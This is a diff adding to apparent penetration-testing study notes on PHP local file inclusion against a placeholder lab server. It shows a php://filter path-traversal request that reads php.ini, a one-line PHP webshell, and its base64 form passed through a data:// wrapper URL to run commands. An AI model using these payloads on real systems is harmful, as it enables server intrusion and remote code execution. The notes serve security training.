@@ -87,4 +87,19 @@ Data Wrapper can be used to include external data, including php code, however t
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 ```
 
-After that, we can decode it and pipe it to grep to grep for allow_url_include, if it
+After that, we can decode it and pipe it to grep to grep for allow_url_include, if it's on, then we can use it.
+
+Using Data Wrapper for RCE:
+
+We have mentioned that data wrapper can include external data, including php code, therefore the easiest way to archive RCE is to have it include a PHP Webshell encoded in base64
+
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64 #Encoding webshell in base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+Then, we pass the encoded string into the data wrapper with text.plain
+```
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
